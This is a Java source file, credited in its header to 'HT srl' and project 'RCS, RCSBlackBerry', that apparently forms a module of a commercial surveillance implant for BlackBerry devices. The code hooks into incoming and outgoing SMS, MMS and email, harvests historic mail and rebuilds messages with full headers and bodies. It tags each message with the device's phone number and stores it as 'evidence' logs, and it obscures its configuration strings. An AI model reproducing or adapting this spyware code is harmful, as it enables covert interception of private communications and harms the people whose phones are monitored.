//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : MessageAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.module;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.Date;
import java.util.Enumeration;
import java.util.Vector;

import net.rim.blackberry.api.mail.Address;
import net.rim.blackberry.api.mail.Header;
import net.rim.blackberry.api.mail.Message;
import net.rim.blackberry.api.phone.Phone;
import net.rim.device.api.util.DataBuffer;
import blackberry.Messages;
import blackberry.config.ChildConf;
import blackberry.config.ConfModule;
import blackberry.config.ConfigurationException;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.evidence.EvidenceType;
import blackberry.evidence.Markup;
import blackberry.evidence.TimestampMarkup;
import blackberry.interfaces.MailObserver;
import blackberry.interfaces.MmsObserver;
import blackberry.interfaces.SmsObserver;
import blackberry.manager.ModuleManager;
import blackberry.module.mail.Filter;
import blackberry.module.mail.Mail;
import blackberry.module.mail.MailListener;
import blackberry.module.mail.MailParser;
import blackberry.module.mail.Prefix;
import blackberry.module.mms.MmsListener;
import blackberry.module.sms.SmsListener;
import blackberry.module.sms.SmsListener45;
import blackberry.module.sms.SmsListener46;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

/**
 * The Class MessageAgent.
 */
public final class ModuleMessage extends BaseModule implements SmsObserver,
        MmsObserver, MailObserver {

    //#ifdef DEBUG
    static Debug debug = new Debug("ModMessages", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    private static final int SMS_VERSION = 2010050501;
    private static final int MAIL_VERSION2 = 2012030601;

    protected static final int SLEEPTIME = 5000;
    protected static final int PERIODTIME = 60 * 60 * 1000;

    private static final int ID_MAIL = 0;
    private static final int ID_SMS = 1;
    private static final int ID_MMS = 2;

    private static final int MAIL_PROGRAM = 1;

    boolean mailEnabled;
    boolean smsEnabled;
    boolean mmsEnabled;

    MailListener mailListener;
    SmsListener smsListener;
    MmsListener mmsListener;

    TimestampMarkup markupDate;
    private Markup configMarkup;
    //public Date lastcheck = new Date(0);

    protected String identification;
    //public IntHashtable filtersSMS = new IntHashtable();
    //public IntHashtable filtersMMS = new IntHashtable();
    //Filter filterEmailCollect;
    //Filter filterEmailRuntime;
    private Filter[] filterCollect = new Filter[3];
    private Filter[] filterRuntime = new Filter[3];

    //boolean firstRun;
    Thread historyThread = null;
    private boolean mailHistory;

    private Date mailFrom = null;
    private Date mailTo = null;

    public static String getStaticType() {
        //18.0=messages
        return Messages.getString("18.0"); //$NON-NLS-1$
    }

    public static ModuleMessage getInstance() {
        return (ModuleMessage) ModuleManager.getInstance().get(getStaticType());
    }

    /**
     * Instantiates a new message agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public ModuleMessage() {

        markupDate = new TimestampMarkup(getStaticType());

        setDelay(SLEEPTIME);
        setPeriod(PERIODTIME);

        mailListener = MailListener.getInstance();

        smsListener = SmsListener46.getInstance();
        mmsListener = MmsListener.getInstance();

    }

    public boolean parse(ConfModule jsonConf) {
        setPeriod(NEVER);
        setDelay(100);

        configMarkup = new Markup(this, 1);

        String[] config = new String[] { "", "", "" };
        String[] oldConfig = new String[] { "", "", "" };
        if (configMarkup.isMarkup()) {
            try {
                oldConfig = configMarkup.readMarkupStringArray();

            } catch (Exception e) {
                oldConfig = new String[] { "", "", "" };
            }
        }

        if (oldConfig == null || oldConfig.length != 3) {
            //#ifdef DEBUG
            debug.trace("parse, wrong oldConfig, regenerate");
            //#endif
            configMarkup.removeMarkup();
            oldConfig = new String[] { "", "", "" };
        }

        //#ifdef DBC
        Check.requires(oldConfig != null && oldConfig.length == 3,
                "parse: wrong oldconfig size");
        Check.requires(config != null && config.length == 3,
                "parse: wrong config size");
        Check.requires(configMarkup != null, "parse: configMarkup null");
        //#endif

        //#ifdef DEBUG
        debug.trace("parse");
        //#endif

        try {

            mailEnabled = readJson(ID_MAIL, Messages.getString("18.1"),
                    jsonConf, config);
            smsEnabled = readJson(ID_SMS, Messages.getString("18.7"), jsonConf,
                    config);
            mmsEnabled = readJson(ID_MMS, Messages.getString("18.9"), jsonConf,
                    config);

            //#ifdef DEBUG
            debug.trace("parse, mail: " + mailEnabled);
            debug.trace("parse, sms: " + smsEnabled);
            debug.trace("parse, mms: " + mmsEnabled);
            //#endif

            if (!config[ID_MAIL].equals(oldConfig[ID_MAIL])) {
                //#ifdef DEBUG
                debug.trace("parse, changed Mail config");
                //#endif
                markupDate.removeMarkup();
            }

            if (!config[ID_SMS].equals(oldConfig[ID_SMS])) {
                //#ifdef DEBUG
                debug.trace("parse, changed SMS config");
                //#endif
            }

            if (!config[ID_MMS].equals(oldConfig[ID_MMS])) {
                //#ifdef DEBUG
                debug.trace("parse, changed MMS config");
                //#endif
            }

            configMarkup.writeMarkupStringArray(config);

        } catch (ConfigurationException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("parse"); //$NON-NLS-1$
            //#endif
            return false;
        } catch (IOException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("parse"); //$NON-NLS-1$
            //#endif
            return false;
        }

        return true;
    }

    private boolean readJson(int id, String child, ConfModule jsonconf,
            String[] config) throws ConfigurationException {

        try {
            ChildConf mailJson = jsonconf.getChild(child); //$NON-NLS-1$
            boolean enabled = mailJson.getBoolean(Messages.getString("18.2")); //$NON-NLS-1$
            String digestConfMail = child + "_" + enabled;

            if (enabled) {
                ChildConf filter = mailJson
                        .getChild(Messages.getString("18.3")); //$NON-NLS-1$
                boolean history = filter.getBoolean(Messages.getString("18.4")); //$NON-NLS-1$
                int maxSizeToLog = 4096;
                digestConfMail += "_" + history;
                if (history) {
                    Date from = filter.getDate(Messages.getString("18.5")); //$NON-NLS-1$
                    Date to = filter.getDate(Messages.getString("18.6"), null); //$NON-NLS-1$
                    maxSizeToLog = filter.getInt("maxsize", 4096);

                    filterCollect[id] = new Filter(history, from, to,
                            maxSizeToLog, maxSizeToLog);
                    digestConfMail += "_" + from + "_" + to;
                }
                filterRuntime[id] = new Filter(enabled, maxSizeToLog);

            }

            config[id] = digestConfMail;

            return enabled;
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("readJson: ", ex);
            //#endif
            return false;
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    public void actualStart() {

        if (smsEnabled) {
            smsListener.addSmsObserver(this, null, null);
        }

        if (mmsEnabled) {
            mmsListener.start();
        }

        if (mailEnabled) {
            //#ifdef DBC
            Check.asserts(filterRuntime[ID_MAIL] != null,
                    "null filterRuntime[ID_MAIL]");
            //#endif
            mailListener.addSingleMailObserver(this);

            if (filterCollect[ID_MAIL] != null) {

                if (historyThread != null) {
                    //#ifdef DEBUG
                    debug.trace("actualRun: stopping historyThread"); //$NON-NLS-1$
                    //#endif

                    mailListener.stopHistory();

                    try {
                        historyThread.join();
                        //#ifdef DEBUG
                        debug.trace("actualRun: joined"); //$NON-NLS-1$
                        //#endif
                    } catch (Exception e) {
                        //#ifdef DEBUG
                        debug.error("actualRun: " + e); //$NON-NLS-1$
                        //#endif
                    }
                }

                historyThread = new Thread(new Runnable() {
                    public void run() {
                        mailListener.retrieveHistoricMails();
                    }
                });
                historyThread.start();

            }
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualLoop() {

        // Ogni ora viene verificato se i nomi degli account corrisponde
        // se non corrisponde, restart dell'agente.

        if (mailEnabled && haveNewAccount()) {
            //#ifdef DEBUG
            debug.info("Restarting MessageAgent, new account"); //$NON-NLS-1$
            //#endif
            ModuleManager.getInstance().reStart(getStaticType()); //$NON-NLS-1$
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    public void actualStop() {
        if (smsEnabled && smsListener != null) {
            smsListener.removeSmsObserver(this);
        }

        if (mmsEnabled && mmsListener != null) {
            //#ifdef MMS
            mmsListener.stop();
            //#endif
        }

        if (mailEnabled && mailListener != null) {
            mailListener.removeSingleMailObserver(this);
        }
    }

    private boolean haveNewAccount() {
        return mailListener.haveNewAccount();
    }

    /**
     * Creates the log.
     * 
     * @param additionalData
     *            the additional data
     * @param content
     *            the content
     * @param logType
     */
    public void createEvidence(final byte[] additionalData,
            final byte[] content, final int logType) {

        Evidence evidence = new Evidence(logType);
        //#ifdef DBC
        Check.requires(content != null, "createEvidence content null"); //$NON-NLS-1$
        Check.requires(evidence != null, "log null"); //$NON-NLS-1$
        //#endif

        evidence.atomicWriteOnce(additionalData, content);

        //#ifdef DEBUG
        debug.trace("Evidence created"); //$NON-NLS-1$
        //#endif
    }

    private Vector tokenize(final byte[] conf) {
        final Vector tokens = new Vector();
        int offset = 0;
        final int length = conf.length;

        while (offset < length) {
            final Prefix token = new Prefix(conf, offset);
            if (!token.isValid()) {
                return null;
            } else {
                tokens.addElement(token);
                offset += token.length + 4;
            }
        }

        return tokens;
    }

    public synchronized void lastcheckSet(String key, Date date) {
        lastcheckSet(key, date, true);
    }

    public synchronized void lastcheckSet(String key, Date date, boolean force) {
        //#ifdef DEBUG
        debug.trace("Writing markup: " + key + " date: " + date); //$NON-NLS-1$ //$NON-NLS-2$
        //#endif

        markupDate.put(key, date, force);

    }

    public synchronized Date lastcheckGet(String key) {

        //#ifdef DBC
        Check.requires(markupDate != null, "lastcheckGet markupDate==null"); //$NON-NLS-1$
        //#endif

        Date date = markupDate.get(key);

        //#ifdef DEBUG
        debug.trace("getLastCheck: " + key + " = " + date); //$NON-NLS-1$ //$NON-NLS-2$
        //#endif

        if (date == null) {
            date = new Date(0);
            //markupDate.put(key, date, true);
        }
        return date;
    }

    public synchronized void lastcheckSave() {
        markupDate.save();
    }

    public synchronized void lastcheckReset() {
        //#ifdef DEBUG
        debug.trace("lastcheckReset markupDate: " + markupDate); //$NON-NLS-1$
        //#endif

        markupDate.removeMarkup();

        //lastcheck = new Date(0); 
    }

    public boolean onNewSms(String message, String address,
            final boolean incoming) {

        //#ifdef DBC
        Check.requires(message != null, "onNewSms: null message"); //$NON-NLS-1$
        //#endif

        //#ifdef DEBUG
        debug.trace("onNewSms message: " + message + " address: " + address //$NON-NLS-1$ //$NON-NLS-2$
                + " incoming: " + incoming); //$NON-NLS-1$
        //#endif

        //final byte[] dataMsg = getSmsDataMessage(message);
        //#ifdef DBC
        Check.asserts(message != null, "onNewSms: null dataMsg"); //$NON-NLS-1$
        //#endif

        //final ByteArrayOutputStream os = null;
        try {
            final int flags = incoming ? 1 : 0;

            DateTime filetime = null;
            final int additionalDataLen = 48;
            final byte[] additionalData = new byte[additionalDataLen];

            String from;
            String to;

            // Check if it's actually a sms

            final String prefix = "//"; //$NON-NLS-1$
            int pos = address.indexOf(prefix);
            if (pos >= 0) {
                address = address.substring(prefix.length() + pos);
            } else {
                //#ifdef DEBUG
                debug.error("Not a sms"); //$NON-NLS-1$
                //#endif
                return false;
            }

            // Filling fields
            final Date date = new Date();

            if (incoming) {
                from = address;
                to = getMyAddress();

            } else {
                from = getMyAddress();
                to = address;
            }

            filetime = new DateTime(date);

            //#ifdef DBC
            Check.asserts(filetime != null, "onNewSms: null filetime"); //$NON-NLS-1$
            //#endif

            // preparing additionalData

            final DataBuffer databuffer = new DataBuffer(additionalData, 0,
                    additionalDataLen, false);
            databuffer.writeInt(SMS_VERSION);
            databuffer.writeInt(flags);
            databuffer.writeLong(filetime.getFiledate());
            databuffer.write(Utils.padByteArray(from.getBytes(), 16));
            databuffer.write(Utils.padByteArray(to.getBytes(), 16));

            //#ifdef DEBUG
            debug.info("sms : " + (incoming ? "incoming" : "outgoing")); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
            debug.info("From: " + from + " To: " + to + " date: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
                    + filetime.toString());
            //#endif

            //#ifdef DBC
            Check.ensures(databuffer.getLength() == additionalDataLen,
                    "SMS Wrong databuffer size: " + databuffer.getLength()); //$NON-NLS-1$
            Check.ensures(additionalData.length == additionalDataLen,
                    "SMS Wrong buffer size: " + additionalData.length); //$NON-NLS-1$
            //#endif

            // Creating log
            createEvidence(additionalData, WChar.getBytes(message),
                    EvidenceType.SMS_NEW);

        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error("onNewSms message: " + ex); //$NON-NLS-1$
            //#endif

        }
        return false;
    }

    public boolean onNewMms(final byte[] byteMessage, String address,
            final boolean incoming) {

        if (byteMessage == null) {
            return false;
        }

        String message = new String(byteMessage);
        //#ifdef DBC
        Check.requires(message != null, "onNewMms: null message"); //$NON-NLS-1$
        //#endif

        //#ifdef DEBUG
        debug.trace("onNewSms message: " + message + " address: " + address //$NON-NLS-1$ //$NON-NLS-2$
                + " incoming: " + incoming); //$NON-NLS-1$
        //#endif

        //final byte[] dataMsg = getSmsDataMessage(message);
        //#ifdef DBC
        Check.asserts(message != null, "onNewMms: null dataMsg"); //$NON-NLS-1$
        //#endif

        //final ByteArrayOutputStream os = null;
        try {
            final int flags = incoming ? 1 : 0;

            DateTime filetime = null;
            final int additionalDataLen = 48;
            final byte[] additionalData = new byte[additionalDataLen];

            String from;
            String to;

            // Check if it's actually a sms

            final String prefix = "//"; //$NON-NLS-1$
            int pos = address.indexOf(prefix);
            if (pos >= 0) {
                address = address.substring(prefix.length() + pos);
            } else {
                //#ifdef DEBUG
                debug.error("Not a mms, address: " + address); //$NON-NLS-1$
                //#endif
                return false;
            }

            // Filling fields
            final Date date = new Date();

            if (incoming) {
                from = address;
                to = getMyAddress();

            } else {
                from = getMyAddress();
                to = address;
            }

            filetime = new DateTime(date);

            //#ifdef DBC
            Check.asserts(filetime != null, "onNewMms: null filetime"); //$NON-NLS-1$
            //#endif

            // preparing additionalData

            final DataBuffer databuffer = new DataBuffer(additionalData, 0,
                    additionalDataLen, false);
            databuffer.writeInt(SMS_VERSION);
            databuffer.writeInt(flags);
            databuffer.writeLong(filetime.getFiledate());
            databuffer.write(Utils.padByteArray(from.getBytes(), 16));
            databuffer.write(Utils.padByteArray(to.getBytes(), 16));

            //#ifdef DEBUG
            debug.info("mms : " + (incoming ? "incoming" : "outgoing")); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
            debug.info("From: " + from + " To: " + to + " date: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
                    + filetime.toString());
            //#endif

            //#ifdef DBC
            Check.ensures(databuffer.getLength() == additionalDataLen,
                    "MMS Wrong databuffer size: " + databuffer.getLength()); //$NON-NLS-1$
            Check.ensures(additionalData.length == additionalDataLen,
                    "SMMS Wrong buffer size: " + additionalData.length); //$NON-NLS-1$
            //#endif

            // Creating log
            createEvidence(additionalData, WChar.getBytes(message),
                    EvidenceType.SMS_NEW);

        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error("onNewMms message: " + ex); //$NON-NLS-1$
            //#endif

        }
        return false;

    }

    private String getMyAddress() {
        final String number = Phone.getDevicePhoneNumber(false);
        if (number == null || number.startsWith(Messages.getString("18.11"))) { //$NON-NLS-1$
            return Messages.getString("18.12"); //$NON-NLS-1$
        }

        //#ifdef DBC
        Check.ensures(number.length() <= 16, "getMyAddress too long: " + number); //$NON-NLS-1$
        //#endif

        return number;
    }

    public void onNewMail(final Message message, final int maxMessageSize,
            final String storeName) {

        //#ifdef DBC
        Check.requires(message != null, "message != null"); //$NON-NLS-1$
        Check.requires(storeName != null, "storeName != null"); //$NON-NLS-1$
        //#endif

        //#ifdef DEBUG
        debug.trace("saveEvidence: " + message + " name: " + storeName + " status: " + message.getStatus() ); //$NON-NLS-1$ //$NON-NLS-2$
        //#endif

        try {
            boolean incoming = message.getStatus() == Message.Status.RX_RECEIVED;
            if(incoming){
                //#ifdef DEBUG
                debug.trace("onNewMail: incoming");
                //#endif
            }
            final int flags = incoming?  0x10 : 0x0;

            //18.13=local
            String from = Messages.getString("18.13"); //$NON-NLS-1$
            if (storeName.indexOf("@") > 0) { //$NON-NLS-1$
                from = storeName;
            }
            final String mail = makeMimeMessage(message, maxMessageSize, from);
            //#ifdef DBC
            Check.asserts(mail != null, "Null mail"); //$NON-NLS-1$
            //#endif

            int size = message.getSize();
            if (size == -1) {
                size = mail.length();
            }

            final DateTime filetime = new DateTime(message.getReceivedDate());

            final byte[] additionalData = new byte[24];

            final DataBuffer databuffer = new DataBuffer(additionalData, 0, 24,
                    false);
            databuffer.writeInt(MAIL_VERSION2);
            databuffer.writeInt(flags);
            databuffer.writeInt(size);
            databuffer.writeLong(filetime.getFiledate());
            databuffer.writeInt(MAIL_PROGRAM);

            //#ifdef DBC
            Check.asserts(additionalData.length == 24,
                    "Mail Wrong buffer size: " + additionalData.length); //$NON-NLS-1$
            //#endif

            //#ifdef DEBUG
            debug.trace("saveEvidence: " //$NON-NLS-1$
                    + mail.substring(0, Math.min(mail.length(), 200)));
            //#endif

            createEvidence(additionalData, mail.getBytes("UTF-8"), //$NON-NLS-1$
                    EvidenceType.MAIL_RAW);

            //messageAgent.createLog(additionalData, mail.getBytes("ISO-8859-1"),
            //      LogType.MAIL_RAW);

        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error("saveEvidence message: " + ex); //$NON-NLS-1$
            //#endif

        }

    }

    private String makeMimeMessage(final Message message,
            final int maxMessageSize, final String from) {
        final Address[] addresses;

        final StringBuffer mailRaw = new StringBuffer();

        // costruisce gli header
        addAllHeaders(message.getAllHeaders(), mailRaw);
        addFromHeaders(message.getAllHeaders(), mailRaw, from);

        // decode del mime, separo text da html
        final MailParser parser = new MailParser(message);
        final Mail mail = parser.parse();

        //#ifdef DEBUG
        debug.trace("Email size: " + message.getSize() + " bytes"); //$NON-NLS-1$ //$NON-NLS-2$
        debug.trace("Sent date: " + message.getSentDate()); //$NON-NLS-1$
        debug.trace("Subject: " + message.getSubject()); //$NON-NLS-1$
        //debug.trace("Body text: " + message.getBodyText());
        //#endif

        // comincia la ricostruzione del MIME
        //18.14=MIME-Version: 1.0
        mailRaw.append(Messages.getString("18.14") + "\r\n"); //$NON-NLS-1$
        final long rnd = Math.abs(Utils.randomLong());
        //18.15=------_NextPart_
        final String boundary = Messages.getString("18.15") + rnd; //$NON-NLS-1$

        if (mail.isMultipart()) {
            //18.16=Content-Type: multipart/alternative; boundary=
            mailRaw.append(Messages.getString("18.16") //$NON-NLS-1$
                    + boundary + "\r\n"); //$NON-NLS-1$
            mailRaw.append("\r\n--" + boundary + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
        }

        if (mail.hasText()) {
            mailRaw.append(mail.plainTextMessageContentType);
            String msg = mail.plainTextMessage;
            if (maxMessageSize > 0 && msg.length() > maxMessageSize) {
                msg = msg.substring(0, maxMessageSize);
            }
            mailRaw.append(msg);
        }

        if (mail.isMultipart()) {
            mailRaw.append("\r\n--" + boundary + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
        }

        if (mail.hasHtml()) {
            //#ifdef DEBUG
            try {
                debug.trace("makeMimeMessage, hasHtml: "
                        + mail.htmlMessageContentType + " "
                        + Utils.byteArrayToHex(mail.htmlMessage.getBytes("UTF-8")));
                debug.trace("makeMimeMessage, html: " + mail.htmlMessage);
            } catch (UnsupportedEncodingException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            //#endif
            //mailRaw.append("Content-Transfer-Encoding: quoted-printable\r\n");
            //mailRaw.append("Content-type: text/html; charset=UTF8\r\n\r\n");
            mailRaw.append(mail.htmlMessageContentType);
            mailRaw.append(mail.htmlMessage);
        }

        if (mail.isMultipart()) {
            mailRaw.append("\r\n--" + boundary + "--\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
        }

        // se il mio parser fallisce, uso la decodifica di base fornita dalla classe Message
        if (mail.isEmpty()) {
            //#ifdef DEBUG
            debug.trace("makeMimeMessage, mail empty");
            //#endif
            // 18.17=Content-type: text/plain; charset=UTF8
            mailRaw.append(Messages.getString("18.17") + "\r\n\r\n"); //$NON-NLS-1$

            String msg = message.getBodyText();
            if (maxMessageSize > 0 && msg.length() > maxMessageSize) {
                msg = msg.substring(0, maxMessageSize);
            }
            mailRaw.append(msg);
        }

        mailRaw.append("\r\n"); //$NON-NLS-1$
       
        final String craftedMail = mailRaw.toString();
        return craftedMail;
    }

    /**
     * Aggiunge alla mail "raw" generata la lista di header presenti nel Message
     * originale
     * 
     * @param headers
     * @param mail
     */
    private void addAllHeaders(final Enumeration headers,
            final StringBuffer mail) {

        while (headers.hasMoreElements()) {
            final Object headerObj = headers.nextElement();
            if (headerObj instanceof Header) {
                final Header header = (Header) headerObj;
                mail.append(header.getName());
                mail.append(header.getValue());
                mail.append("\r\n"); //$NON-NLS-1$
                //#ifdef DEBUG
                debug.trace("addAllHeaders "+ header.getName() + " = " + header.getValue());
                //#endif
            } else {
                //#ifdef DEBUG
                debug.error("Unknown header type: " + headerObj); //$NON-NLS-1$
                //#endif
            }
        }
    }

    /**
     * Il metodo addAllHeaders non estrae il campo from. Occorre specificarglelo
     * esplicitamente.
     * 
     * @param headers
     * @param mail
     * @param from
     */
    private void addFromHeaders(final Enumeration headers,
            final StringBuffer mail, final String from) {

        boolean fromFound = false;
        while (headers.hasMoreElements()) {
            final Object headerObj = headers.nextElement();
            if (headerObj instanceof Header) {
                final Header header = (Header) headerObj;
                if (header.getName().startsWith(Messages.getString("18.18"))) { //$NON-NLS-1$
                    fromFound = true;
                    //#ifdef DEBUG
                    debug.trace("addFromHeaders, from found");
                    //#endif
                }
            }
        }
        if (!fromFound) {
            //#ifdef DEBUG
            debug.info("Adding from: " + from); //$NON-NLS-1$
            //#endif
            mail.append(Messages.getString("18.19") + from + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
        }
    }

    public Filter getFilterEmailRealtime() {
        //#ifdef DBC
        if (mailEnabled) {
            Check.requires(filterRuntime[ID_MAIL] != null,
                    "getFilterEmailRuntime: null filterEmailRuntime ");
        }
        //#endif
        return filterRuntime[ID_MAIL];
    }

    public Filter getFilterEmailCollect() {
        //#ifdef DBC
        if (mailHistory) {
            Check.requires(filterCollect[ID_MAIL] != null,
                    "getFilterEmailCollect: null filterEmailCollect ");
        }
        //#endif
        return filterCollect[ID_MAIL];
    }
}
